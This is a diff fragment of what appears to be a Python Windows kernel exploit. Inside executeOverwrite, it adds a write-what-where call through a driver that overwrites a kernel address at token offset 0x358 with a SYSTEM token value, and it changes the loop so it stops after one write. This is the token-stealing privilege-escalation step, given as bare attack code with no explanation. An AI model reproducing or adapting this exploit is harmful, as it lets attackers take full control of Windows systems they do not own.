@@ -315,13 +315,14 @@ def executeOverwrite():
 
 
         while True:
-
+            where=0xffff9885390217c0+0x358
+            writeWhatWhere(driver, system_token_value, where)
             total_writes = total_writes + 1
 
             #backEPROCESS = forwardEPROCESS
             
 
-            if total_writes > 500:
+            if total_writes > 0:
                 break
             
 
